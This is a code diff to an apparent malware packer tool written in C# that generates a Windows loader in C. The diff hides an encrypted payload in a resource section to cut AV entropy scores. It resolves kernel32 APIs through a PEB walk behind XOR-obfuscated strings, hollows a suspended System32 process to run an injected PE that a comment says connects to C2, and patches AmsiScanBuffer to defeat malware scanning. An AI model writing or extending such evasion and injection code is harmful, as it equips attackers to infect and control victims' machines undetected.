@@ -271,10 +271,12 @@ END
 
     // ── Resource file (icon + version info) ──────────────────────────────────────
 
-    private static string GenerateResourceSource(string? iconPath, LoaderMetadata? meta, string exeName)
+    private static string GenerateResourceSource(string? iconPath, LoaderMetadata? meta, string exeName, string payloadBinPath)
     {
         var sb = new StringBuilder();
         sb.AppendLine("#include <windows.h>");
+        // Payload blob as RCDATA — moves high-entropy .data to .rsrc, lower AV entropy weight
+        sb.AppendLine($"101 RCDATA \"{EscRc(payloadBinPath)}\"");
         if (!string.IsNullOrEmpty(iconPath))
             sb.AppendLine($"1 ICON \"{EscRc(iconPath)}\"");
         if (meta != null)
@@ -339,6 +341,7 @@ END
         string fnDcmp = Rnd("_b");
         string fnHol  = Rnd("_c");
         string fnJunk = Rnd("_j");
+        string fnRes  = Rnd("_r");
         string varX   = Rnd("x_");
         string varY   = Rnd("y_");
         uint jk1 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
@@ -361,14 +364,37 @@ END
         var sHKey   = MakeXorStr("__SERO_H__");
         var sHVal   = MakeXorStr("1");
         var sHTgt   = MakeXorStr(hollowTarget);
+        // kernel32 dynamic resolution strings
+        var sK32    = MakeXorStr("kernel32.dll");
+        var sLLA    = MakeXorStr("LoadLibraryA");
+        var sGPA    = MakeXorStr("GetProcAddress");
+        var sCPA    = MakeXorStr("CreateProcessA");
+        var sVAEx   = MakeXorStr("VirtualAllocEx");
+        var sVPEx   = MakeXorStr("VirtualProtectEx");
+        var sWPM    = MakeXorStr("WriteProcessMemory");
+        var sGTC    = MakeXorStr("GetThreadContext");
+        var sSTC    = MakeXorStr("SetThreadContext");
+        var sRTh    = MakeXorStr("ResumeThread");
+        var sTPA    = MakeXorStr("TerminateProcess");
+        var sCH     = MakeXorStr("CloseHandle");
+        var sCRT    = MakeXorStr("CreateRemoteThread");
+        var sWSO    = MakeXorStr("WaitForSingleObject");
+        var sGSD    = MakeXorStr("GetSystemDirectoryA");
+        var sSEV    = MakeXorStr("SetEnvironmentVariableA");
+        var sVA     = MakeXorStr("VirtualAlloc");
+        var sVF     = MakeXorStr("VirtualFree");
+        var sGCPID  = MakeXorStr("GetCurrentProcessId");
+        var sAmsiD  = MakeXorStr("amsi.dll");
+        var sAmsiF  = MakeXorStr("AmsiScanBuffer");
 
         return $$"""
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
+#include <intrin.h>
 #include <stdint.h>
 #include <string.h>
 
-/* BCrypt/Cabinet types — no IAT-linking headers, no #pragma comment(lib,...) */
+/* BCrypt/Cabinet types — resolved dynamically, no IAT linking */
 typedef LONG NTSTATUS;
 typedef void* BCH;
 typedef void* DCH;
@@ -385,6 +411,35 @@ typedef NTSTATUS(WINAPI*_pBcCA)(BCH,ULONG);
 typedef BOOL    (WINAPI*_pCrDc)(DWORD,void*,DCH*);
 typedef BOOL    (WINAPI*_pDcmp)(DCH,void*,SIZE_T,void*,SIZE_T,SIZE_T*);
 typedef BOOL    (WINAPI*_pClDc)(DCH);
+/* kernel32 function pointer types */
+typedef HMODULE (WINAPI*_pLLA )(LPCSTR);
+typedef FARPROC (WINAPI*_pGPA )(HMODULE,LPCSTR);
+typedef BOOL    (WINAPI*_pCPA )(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
+typedef LPVOID  (WINAPI*_pVAEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
+typedef BOOL    (WINAPI*_pVPEx)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
+typedef BOOL    (WINAPI*_pWPM )(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
+typedef BOOL    (WINAPI*_pGTC )(HANDLE,LPCONTEXT);
+typedef BOOL    (WINAPI*_pSTC )(HANDLE,const CONTEXT*);
+typedef DWORD   (WINAPI*_pRTh )(HANDLE);
+typedef BOOL    (WINAPI*_pTPA )(HANDLE,UINT);
+typedef BOOL    (WINAPI*_pCH  )(HANDLE);
+typedef HANDLE  (WINAPI*_pCRT )(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
+typedef DWORD   (WINAPI*_pWSO )(HANDLE,DWORD);
+typedef UINT    (WINAPI*_pGSD )(LPSTR,UINT);
+typedef BOOL    (WINAPI*_pSEV )(LPCSTR,LPCSTR);
+typedef LPVOID  (WINAPI*_pVA  )(LPVOID,SIZE_T,DWORD,DWORD);
+typedef BOOL    (WINAPI*_pVF  )(LPVOID,SIZE_T,DWORD);
+typedef DWORD   (WINAPI*_pGCPID)(void);
+/* global function pointer table — filled by _res_apis() */
+static _pLLA  g_LLA=NULL; static _pGPA  g_GPA=NULL;
+static _pCPA  g_CPA=NULL; static _pVAEx g_VAEx=NULL;
+static _pVPEx g_VPEx=NULL;static _pWPM  g_WPM=NULL;
+static _pGTC  g_GTC=NULL; static _pSTC  g_STC=NULL;
+static _pRTh  g_RTh=NULL; static _pTPA  g_TPA=NULL;
+static _pCH   g_CH=NULL;  static _pCRT  g_CRT=NULL;
+static _pWSO  g_WSO=NULL; static _pGSD  g_GSD=NULL;
+static _pSEV  g_SEV=NULL; static _pVA   g_VA=NULL;
+static _pVF   g_VF=NULL;  static _pGCPID g_GCPID=NULL;
 /* XOR-encoded API strings */
 {{sBcrypt.Decl}}
 {{sCab.Decl}}
@@ -401,12 +456,104 @@ typedef BOOL    (WINAPI*_pClDc)(DCH);
 {{sHKey.Decl}}
 {{sHVal.Decl}}
 {{sHTgt.Decl}}
+{{sK32.Decl}}
+{{sLLA.Decl}}
+{{sGPA.Decl}}
+{{sCPA.Decl}}
+{{sVAEx.Decl}}
+{{sVPEx.Decl}}
+{{sWPM.Decl}}
+{{sGTC.Decl}}
+{{sSTC.Decl}}
+{{sRTh.Decl}}
+{{sTPA.Decl}}
+{{sCH.Decl}}
+{{sCRT.Decl}}
+{{sWSO.Decl}}
+{{sGSD.Decl}}
+{{sSEV.Decl}}
+{{sVA.Decl}}
+{{sVF.Decl}}
+{{sGCPID.Decl}}
+{{sAmsiD.Decl}}
+{{sAmsiF.Decl}}
 static void _xd(unsigned char* p,int n,unsigned char k){int i;for(i=0;i<n;i++)p[i]^=k;p[n]=0;}
 
+/* PEB walk: find loaded module by lowercase ASCII name */
+static HMODULE _find_mod(const char* nm,int nlen){
+    ULONG_PTR peb=(ULONG_PTR)__readgsqword(0x60);
+    BYTE* ldr=*(BYTE**)(peb+0x18);
+    LIST_ENTRY* head=(LIST_ENTRY*)(ldr+0x20);
+    LIST_ENTRY* cur=head->Flink;
+    while(cur!=head){
+        BYTE* ent=(BYTE*)cur-0x10;
+        PVOID base=*(PVOID*)(ent+0x30);
+        USHORT blen=*(USHORT*)(ent+0x58);
+        WCHAR* bbuf=*(WCHAR**)(ent+0x60);
+        if(base&&blen==(USHORT)(nlen*2)&&bbuf){
+            int m=1;
+            for(int i=0;i<nlen;i++){
+                char ac=(char)(bbuf[i]&0xFF);
+                if(ac>='A'&&ac<='Z') ac|=0x20;
+                if(ac!=nm[i]){m=0;break;}
+            }
+            if(m) return (HMODULE)base;
+        }
+        cur=cur->Flink;
+    }
+    return NULL;
+}
 
-{{ToCArray(cipher, "g_enc")}}
-{{ToCArray(key,    "g_key")}}
-{{ToCArray(iv,     "g_iv")}}
+/* Manual GetProcAddress via PE export directory */
+static FARPROC _manu_gpa(HMODULE hmod,const char* name){
+    BYTE* base=(BYTE*)hmod;
+    IMAGE_DOS_HEADER* dos=(IMAGE_DOS_HEADER*)base;
+    if(dos->e_magic!=0x5A4D) return NULL;
+    IMAGE_NT_HEADERS64* nt=(IMAGE_NT_HEADERS64*)(base+dos->e_lfanew);
+    DWORD eRva=nt->OptionalHeader.DataDirectory[0].VirtualAddress;
+    if(!eRva) return NULL;
+    IMAGE_EXPORT_DIRECTORY* exp=(IMAGE_EXPORT_DIRECTORY*)(base+eRva);
+    DWORD* names=(DWORD*)(base+exp->AddressOfNames);
+    WORD*  ords =(WORD*) (base+exp->AddressOfNameOrdinals);
+    DWORD* funcs=(DWORD*)(base+exp->AddressOfFunctions);
+    for(DWORD i=0;i<exp->NumberOfNames;i++){
+        const char* fn=(const char*)(base+names[i]);
+        const char* a=fn,*b=name;
+        while(*a&&*a==*b){a++;b++;}
+        if(!*a&&!*b) return (FARPROC)(base+funcs[ords[i]]);
+    }
+    return NULL;
+}
+
+/* Resolve all kernel32 APIs via PEB walk — no IAT imports needed */
+static void {{fnRes}}(void){
+    unsigned char _nm[40];
+    memcpy(_nm,{{sK32.Var}},{{sK32.Len}});_xd(_nm,{{sK32.Len}},0x{{sK32.Key:X2}});
+    HMODULE hK=(HMODULE)_find_mod((char*)_nm,{{sK32.Len}});
+    if(!hK) return;
+    unsigned char _t[40];
+    memcpy(_t,{{sLLA.Var}},{{sLLA.Len}});_xd(_t,{{sLLA.Len}},0x{{sLLA.Key:X2}});g_LLA=(_pLLA)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sGPA.Var}},{{sGPA.Len}});_xd(_t,{{sGPA.Len}},0x{{sGPA.Key:X2}});g_GPA=(_pGPA)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sCPA.Var}},{{sCPA.Len}});_xd(_t,{{sCPA.Len}},0x{{sCPA.Key:X2}});g_CPA=(_pCPA)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sVAEx.Var}},{{sVAEx.Len}});_xd(_t,{{sVAEx.Len}},0x{{sVAEx.Key:X2}});g_VAEx=(_pVAEx)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sVPEx.Var}},{{sVPEx.Len}});_xd(_t,{{sVPEx.Len}},0x{{sVPEx.Key:X2}});g_VPEx=(_pVPEx)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sWPM.Var}},{{sWPM.Len}});_xd(_t,{{sWPM.Len}},0x{{sWPM.Key:X2}});g_WPM=(_pWPM)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sGTC.Var}},{{sGTC.Len}});_xd(_t,{{sGTC.Len}},0x{{sGTC.Key:X2}});g_GTC=(_pGTC)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sSTC.Var}},{{sSTC.Len}});_xd(_t,{{sSTC.Len}},0x{{sSTC.Key:X2}});g_STC=(_pSTC)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sRTh.Var}},{{sRTh.Len}});_xd(_t,{{sRTh.Len}},0x{{sRTh.Key:X2}});g_RTh=(_pRTh)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sTPA.Var}},{{sTPA.Len}});_xd(_t,{{sTPA.Len}},0x{{sTPA.Key:X2}});g_TPA=(_pTPA)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sCH.Var}},{{sCH.Len}});_xd(_t,{{sCH.Len}},0x{{sCH.Key:X2}});g_CH=(_pCH)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sCRT.Var}},{{sCRT.Len}});_xd(_t,{{sCRT.Len}},0x{{sCRT.Key:X2}});g_CRT=(_pCRT)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sWSO.Var}},{{sWSO.Len}});_xd(_t,{{sWSO.Len}},0x{{sWSO.Key:X2}});g_WSO=(_pWSO)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sGSD.Var}},{{sGSD.Len}});_xd(_t,{{sGSD.Len}},0x{{sGSD.Key:X2}});g_GSD=(_pGSD)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sSEV.Var}},{{sSEV.Len}});_xd(_t,{{sSEV.Len}},0x{{sSEV.Key:X2}});g_SEV=(_pSEV)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sVA.Var}},{{sVA.Len}});_xd(_t,{{sVA.Len}},0x{{sVA.Key:X2}});g_VA=(_pVA)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sVF.Var}},{{sVF.Len}});_xd(_t,{{sVF.Len}},0x{{sVF.Key:X2}});g_VF=(_pVF)_manu_gpa(hK,(char*)_t);
+    memcpy(_t,{{sGCPID.Var}},{{sGCPID.Len}});_xd(_t,{{sGCPID.Len}},0x{{sGCPID.Key:X2}});g_GCPID=(_pGCPID)_manu_gpa(hK,(char*)_t);
+}
+
+{{ToCArray(key, "g_key")}}
+{{ToCArray(iv,  "g_iv")}}
 static const unsigned int g_cmp_size = {{compressedLen}}U;
 static const unsigned int g_org_size = {{originalLen}}U;
 
@@ -423,24 +570,25 @@ static __declspec(noinline) unsigned int {{fnJunk}}(unsigned int {{varX}}) {
 }
 #pragma optimize("", on)
 
-/* AES-256-CBC decrypt — dynamic BCrypt, no bcrypt.lib in IAT */
+/* AES-256-CBC decrypt — dynamic BCrypt, LoadLibraryA/GetProcAddress via g_LLA/g_GPA */
 static unsigned char* {{fnAes}}(const unsigned char* src, unsigned int src_len, unsigned int* out_len) {
+    if(!g_LLA||!g_GPA||!g_VA||!g_VF) return NULL;
     unsigned char _db[14]; memcpy(_db,{{sBcrypt.Var}},{{sBcrypt.Len}}); _xd(_db,{{sBcrypt.Len}},0x{{sBcrypt.Key:X2}});
-    HMODULE hB=LoadLibraryA((LPCSTR)_db); if (!hB) return NULL;
+    HMODULE hB=(HMODULE)g_LLA((LPCSTR)_db); if (!hB) return NULL;
     unsigned char _n1[30]; memcpy(_n1,{{sBcOA.Var}},{{sBcOA.Len}}); _xd(_n1,{{sBcOA.Len}},0x{{sBcOA.Key:X2}});
-    _pBcOA fOA=(_pBcOA)GetProcAddress(hB,(LPCSTR)_n1);
+    _pBcOA fOA=(_pBcOA)g_GPA(hB,(LPCSTR)_n1);
     unsigned char _n2[20]; memcpy(_n2,{{sBcGP.Var}},{{sBcGP.Len}}); _xd(_n2,{{sBcGP.Len}},0x{{sBcGP.Key:X2}});
-    _pBcGP fGP=(_pBcGP)GetProcAddress(hB,(LPCSTR)_n2);
+    _pBcGP fGP=(_pBcGP)g_GPA(hB,(LPCSTR)_n2);
     unsigned char _n3[20]; memcpy(_n3,{{sBcSP.Var}},{{sBcSP.Len}}); _xd(_n3,{{sBcSP.Len}},0x{{sBcSP.Key:X2}});
-    _pBcSP fSP=(_pBcSP)GetProcAddress(hB,(LPCSTR)_n3);
+    _pBcSP fSP=(_pBcSP)g_GPA(hB,(LPCSTR)_n3);
     unsigned char _n4[30]; memcpy(_n4,{{sBcGK.Var}},{{sBcGK.Len}}); _xd(_n4,{{sBcGK.Len}},0x{{sBcGK.Key:X2}});
-    _pBcGK fGK=(_pBcGK)GetProcAddress(hB,(LPCSTR)_n4);
+    _pBcGK fGK=(_pBcGK)g_GPA(hB,(LPCSTR)_n4);
     unsigned char _n5[16]; memcpy(_n5,{{sBcDc.Var}},{{sBcDc.Len}}); _xd(_n5,{{sBcDc.Len}},0x{{sBcDc.Key:X2}});
-    _pBcDc fDc=(_pBcDc)GetProcAddress(hB,(LPCSTR)_n5);
+    _pBcDc fDc=(_pBcDc)g_GPA(hB,(LPCSTR)_n5);
     unsigned char _n6[18]; memcpy(_n6,{{sBcDK.Var}},{{sBcDK.Len}}); _xd(_n6,{{sBcDK.Len}},0x{{sBcDK.Key:X2}});
-    _pBcDK fDK=(_pBcDK)GetProcAddress(hB,(LPCSTR)_n6);
+    _pBcDK fDK=(_pBcDK)g_GPA(hB,(LPCSTR)_n6);
     unsigned char _n7[32]; memcpy(_n7,{{sBcCA.Var}},{{sBcCA.Len}}); _xd(_n7,{{sBcCA.Len}},0x{{sBcCA.Key:X2}});
-    _pBcCA fCA=(_pBcCA)GetProcAddress(hB,(LPCSTR)_n7);
+    _pBcCA fCA=(_pBcCA)g_GPA(hB,(LPCSTR)_n7);
     if (!fOA||!fGP||!fSP||!fGK||!fDc||!fDK||!fCA) return NULL;
     BCH hAlg=NULL,hKey=NULL;
     unsigned char keyObj[1024]={0}; ULONG cbKeyObj=0,cbData=0;
@@ -452,11 +600,11 @@ static unsigned char* {{fnAes}}(const unsigned char* src, unsigned int src_len, 
     unsigned char iv_copy[16]; memcpy(iv_copy,g_iv,16);
     ULONG plainLen=0;
     fDc(hKey,(PUCHAR)src,src_len,NULL,iv_copy,16,NULL,0,&plainLen,_BC_PAD);
-    out=(unsigned char*)VirtualAlloc(NULL,plainLen,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    out=(unsigned char*)g_VA(NULL,plainLen,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
     if (!out) goto done;
     memcpy(iv_copy,g_iv,16);
     if (!_BCR_OK(fDc(hKey,(PUCHAR)src,src_len,NULL,iv_copy,16,out,plainLen,&cbData,_BC_PAD))) {
-        VirtualFree(out,0,MEM_RELEASE); out=NULL;
+        g_VF(out,0,MEM_RELEASE); out=NULL;
     } else { *out_len=cbData; }
 done:
     if (hKey) fDK(hKey);
@@ -464,30 +612,32 @@ done:
     return out;
 }
 
-/* LZMS decompress — dynamic Cabinet, no cabinet.lib in IAT */
+/* LZMS decompress — dynamic Cabinet, g_LLA/g_GPA, g_VA/g_VF */
 static unsigned char* {{fnDcmp}}(const unsigned char* src, SIZE_T src_len, SIZE_T out_len) {
+    if(!g_LLA||!g_GPA||!g_VA||!g_VF) return NULL;
     unsigned char _dc[14]; memcpy(_dc,{{sCab.Var}},{{sCab.Len}}); _xd(_dc,{{sCab.Len}},0x{{sCab.Key:X2}});
-    HMODULE hC=LoadLibraryA((LPCSTR)_dc); if (!hC) return NULL;
+    HMODULE hC=(HMODULE)g_LLA((LPCSTR)_dc); if (!hC) return NULL;
     unsigned char _m1[20]; memcpy(_m1,{{sCrDc.Var}},{{sCrDc.Len}}); _xd(_m1,{{sCrDc.Len}},0x{{sCrDc.Key:X2}});
-    _pCrDc fCrDc=(_pCrDc)GetProcAddress(hC,(LPCSTR)_m1);
+    _pCrDc fCrDc=(_pCrDc)g_GPA(hC,(LPCSTR)_m1);
     unsigned char _m2[12]; memcpy(_m2,{{sDcmpS.Var}},{{sDcmpS.Len}}); _xd(_m2,{{sDcmpS.Len}},0x{{sDcmpS.Key:X2}});
-    _pDcmp fDcmp=(_pDcmp)GetProcAddress(hC,(LPCSTR)_m2);
+    _pDcmp fDcmp=(_pDcmp)g_GPA(hC,(LPCSTR)_m2);
     unsigned char _m3[18]; memcpy(_m3,{{sClDc.Var}},{{sClDc.Len}}); _xd(_m3,{{sClDc.Len}},0x{{sClDc.Key:X2}});
-    _pClDc fClDc=(_pClDc)GetProcAddress(hC,(LPCSTR)_m3);
+    _pClDc fClDc=(_pClDc)g_GPA(hC,(LPCSTR)_m3);
     if (!fCrDc||!fDcmp||!fClDc) return NULL;
     DCH hDec=NULL;
     if (!fCrDc(_LZM_ALG,NULL,&hDec)) return NULL;
-    unsigned char* out=(unsigned char*)VirtualAlloc(NULL,out_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    unsigned char* out=(unsigned char*)g_VA(NULL,out_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
     if (!out) { fClDc(hDec); return NULL; }
     SIZE_T final=0;
     BOOL ok=fDcmp(hDec,(PVOID)src,src_len,out,out_len,&final);
     fClDc(hDec);
-    if (!ok||final!=out_len) { VirtualFree(out,0,MEM_RELEASE); return NULL; }
+    if (!ok||final!=out_len) { g_VF(out,0,MEM_RELEASE); return NULL; }
     return out;
 }
 
 /* Hollow target process and inject stub PE */
 static int {{fnHol}}(unsigned char* pe, unsigned int pe_len) {
+    if(!g_CPA||!g_VAEx||!g_VPEx||!g_WPM||!g_GTC||!g_STC||!g_RTh||!g_TPA||!g_CH||!g_VA||!g_VF) return 0;
     (void)pe_len;
     IMAGE_DOS_HEADER* dos=(IMAGE_DOS_HEADER*)pe;
     if (dos->e_magic!=0x5A4D) return 0;
@@ -499,10 +649,10 @@ static int {{fnHol}}(unsigned char* pe, unsigned int pe_len) {
     /* Set env var so hollowed child skips re-hollow and connects to C2 */
     unsigned char _ek[12]; memcpy(_ek,{{sHKey.Var}},{{sHKey.Len}}); _xd(_ek,{{sHKey.Len}},0x{{sHKey.Key:X2}});
     unsigned char _ev[4];  memcpy(_ev,{{sHVal.Var}},{{sHVal.Len}}); _xd(_ev,{{sHVal.Len}},0x{{sHVal.Key:X2}});
-    SetEnvironmentVariableA((LPCSTR)_ek,(LPCSTR)_ev);
+    g_SEV((LPCSTR)_ek,(LPCSTR)_ev);
     /* Build System32\target path */
     char tpath[MAX_PATH]={0};
-    GetSystemDirectoryA(tpath,MAX_PATH);
+    g_GSD(tpath,MAX_PATH);
     int sd=0; while(tpath[sd]) sd++;
     tpath[sd++]='\\';
     unsigned char _tn[{{sHTgt.Len + 1}}]; memcpy(_tn,{{sHTgt.Var}},{{sHTgt.Len}}); _xd(_tn,{{sHTgt.Len}},0x{{sHTgt.Key:X2}});
@@ -511,15 +661,15 @@ static int {{fnHol}}(unsigned char* pe, unsigned int pe_len) {
     /* Create target process suspended */
     STARTUPINFOA si; memset(&si,0,sizeof(si)); si.cb=sizeof(si);
     PROCESS_INFORMATION pi; memset(&pi,0,sizeof(pi));
-    if (!CreateProcessA(tpath,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) return 0;
-    /* Alloc image region in remote process */
-    LPVOID rem=VirtualAllocEx(pi.hProcess,(LPVOID)preferred,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
-    if (!rem) rem=VirtualAllocEx(pi.hProcess,NULL,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
-    if (!rem) { TerminateProcess(pi.hProcess,0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; }
+    if (!g_CPA(tpath,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) return 0;
+    /* Alloc RW region in remote process — no PAGE_EXECUTE_READWRITE */
+    LPVOID rem=g_VAEx(pi.hProcess,(LPVOID)preferred,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
+    if (!rem) rem=g_VAEx(pi.hProcess,NULL,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
+    if (!rem) { g_TPA(pi.hProcess,0); g_CH(pi.hThread); g_CH(pi.hProcess); return 0; }
     ULONG_PTR remBase=(ULONG_PTR)rem;
     /* Build local mapped image */
-    unsigned char* img=(unsigned char*)VirtualAlloc(NULL,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
-    if (!img) { TerminateProcess(pi.hProcess,0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; }
+    unsigned char* img=(unsigned char*)g_VA(NULL,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
+    if (!img) { g_TPA(pi.hProcess,0); g_CH(pi.hThread); g_CH(pi.hProcess); return 0; }
     memcpy(img,pe,nt->OptionalHeader.SizeOfHeaders);
     IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)((UCHAR*)nt+sizeof(IMAGE_NT_HEADERS64));
     for (int i=0;i<nt->FileHeader.NumberOfSections;i++)
@@ -539,38 +689,76 @@ static int {{fnHol}}(unsigned char* pe, unsigned int pe_len) {
             rel=(IMAGE_BASE_RELOCATION*)((UCHAR*)rel+rel->SizeOfBlock);
         }
     }
-    /* Write image to remote process */
-    SIZE_T wr=0; WriteProcessMemory(pi.hProcess,rem,img,imgSz,&wr);
-    VirtualFree(img,0,MEM_RELEASE);
-    /* Update PEB.ImageBase (Rdx = PEB at thread start on x64) and redirect entry point */
+    /* Write image to remote, then flip to RX — no persistent RWX page */
+    SIZE_T wr=0; g_WPM(pi.hProcess,rem,img,imgSz,&wr);
+    g_VF(img,0,MEM_RELEASE);
+    DWORD oldProt=0;
+    g_VPEx(pi.hProcess,rem,imgSz,PAGE_EXECUTE_READ,&oldProt);
+    /* Update PEB.ImageBase and redirect entry point */
     CONTEXT ctx; memset(&ctx,0,sizeof(ctx)); ctx.ContextFlags=CONTEXT_FULL;
-    if (!GetThreadContext(pi.hThread,&ctx)) {
-        TerminateProcess(pi.hProcess,0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0;
+    if (!g_GTC(pi.hThread,&ctx)) {
+        g_TPA(pi.hProcess,0); g_CH(pi.hThread); g_CH(pi.hProcess); return 0;
     }
     ULONG_PTR peb=(ULONG_PTR)ctx.Rdx;
-    WriteProcessMemory(pi.hProcess,(LPVOID)(peb+0x10),&remBase,sizeof(remBase),NULL);
+    g_WPM(pi.hProcess,(LPVOID)(peb+0x10),&remBase,sizeof(remBase),NULL);
     ctx.Rip=remBase+epRva;
-    SetThreadContext(pi.hThread,&ctx);
-    ResumeThread(pi.hThread);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    g_STC(pi.hThread,&ctx);
+    /* AMSI bypass: load amsi.dll in this process (same ASLR base as child),
+       force-load it in child via remote thread, then patch AmsiScanBuffer */
+    if(g_LLA&&g_CRT&&g_WSO&&g_VPEx&&g_WPM&&g_VAEx&&g_VF){
+        unsigned char _ad[10]; memcpy(_ad,{{sAmsiD.Var}},{{sAmsiD.Len}}); _xd(_ad,{{sAmsiD.Len}},0x{{sAmsiD.Key:X2}});
+        HMODULE hAmsi=(HMODULE)g_LLA((LPCSTR)_ad);
+        if(hAmsi){
+            unsigned char _af[16]; memcpy(_af,{{sAmsiF.Var}},{{sAmsiF.Len}}); _xd(_af,{{sAmsiF.Len}},0x{{sAmsiF.Key:X2}});
+            FARPROC pASB=_manu_gpa(hAmsi,(const char*)_af);
+            if(pASB){
+                /* Force amsi.dll into child so same VA is mapped there */
+                LPVOID rStr=g_VAEx(pi.hProcess,NULL,16,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+                if(rStr){
+                    g_WPM(pi.hProcess,rStr,_ad,10,NULL);
+                    HANDLE hT=g_CRT(pi.hProcess,NULL,0,(LPTHREAD_START_ROUTINE)(LPVOID)g_LLA,rStr,0,NULL);
+                    if(hT){g_WSO(hT,5000);g_CH(hT);}
+                    g_VF(rStr,0,MEM_RELEASE);
+                }
+                /* Patch AmsiScanBuffer: set *result=AMSI_RESULT_CLEAN, return S_OK */
+                static BYTE _ap[]={0x48,0x8B,0x44,0x24,0x30,0xC7,0x00,0x01,0x00,0x00,0x00,0x33,0xC0,0xC3};
+                DWORD _op=0;
+                g_VPEx(pi.hProcess,(LPVOID)pASB,sizeof(_ap),PAGE_EXECUTE_READWRITE,&_op);
+                g_WPM(pi.hProcess,(LPVOID)pASB,_ap,sizeof(_ap),NULL);
+                g_VPEx(pi.hProcess,(LPVOID)pASB,sizeof(_ap),_op,&_op);
+            }
+        }
+    }
+    g_RTh(pi.hThread);
+    g_CH(pi.hThread);
+    g_CH(pi.hProcess);
     return 1;
 }
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
     (void)h; (void)p; (void)cmd; (void)show;
-    volatile unsigned int  _dc={{fnJunk}}(GetCurrentProcessId()); (void)_dc;
+    {{fnRes}}();
+    if(!g_VA||!g_VF) return 1;
+    volatile unsigned int  _dc={{fnJunk}}(g_GCPID?(g_GCPID()):0); (void)_dc;
     volatile unsigned long long _d1={{fnAsm1}}(); (void)_d1;
     volatile unsigned long long _d2={{fnAsm2}}(); (void)_d2;
     volatile unsigned long long _d3={{fnAsm3}}(); (void)_d3;
+    /* Load payload from embedded resource (RT_RCDATA id 101) */
+    HRSRC hR=FindResource(NULL,MAKEINTRESOURCE(101),RT_RCDATA);
+    if(!hR) return 1;
+    HGLOBAL hG=LoadResource(NULL,hR);
+    if(!hG) return 1;
+    const unsigned char* g_enc=(const unsigned char*)LockResource(hG);
+    unsigned int g_enc_len=SizeofResource(NULL,hR);
+    if(!g_enc||!g_enc_len) return 1;
     unsigned int plainLen=0;
     unsigned char* compressed={{fnAes}}(g_enc,g_enc_len,&plainLen);
     if (!compressed) return 1;
     unsigned char* stub_pe={{fnDcmp}}(compressed,(SIZE_T)plainLen,(SIZE_T)g_org_size);
-    VirtualFree(compressed,0,MEM_RELEASE);
+    g_VF(compressed,0,MEM_RELEASE);
     if (!stub_pe) return 1;
     {{fnHol}}(stub_pe,g_org_size);
-    VirtualFree(stub_pe,0,MEM_RELEASE);
+    g_VF(stub_pe,0,MEM_RELEASE);
     return 0;
 }
 """;
@@ -673,6 +861,7 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
         var (asmSrc, fn1, fn2, fn3) = GenerateAsmJunk();
         string loaderSrc = GenerateLoaderSource(cipher, key, iv,
             (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3, hollowTarget);
+        // cipher is written as a resource blob — no longer embedded in C .data section
 
         string? clPath = await Task.Run(() => FindClExe(log));
         if (clPath == null) { log("[!] CustomPacker: cl.exe not found — skipped."); return; }
@@ -699,31 +888,32 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
             if (!ok || !File.Exists(objPath)) return;
             log("[+] CustomPacker: x64 ASM junk compiled.");
 
-            // 2. Compile RC resource (icon + version) if applicable
+            // 2. Always compile RC: payload blob (RCDATA 101) + optional icon/version
             string resArg = "";
-            bool   hasResources = !string.IsNullOrEmpty(iconPath) || meta != null;
-            if (hasResources)
             {
+                var payloadBin = Path.Combine(tempDir, "payload.bin");
+                await File.WriteAllBytesAsync(payloadBin, cipher);
+
                 var rcExe = vsEnv != null ? FindRcExe(vsEnv) : null;
                 if (rcExe != null)
                 {
                     var rcSrc  = Path.Combine(tempDir, "loader.rc");
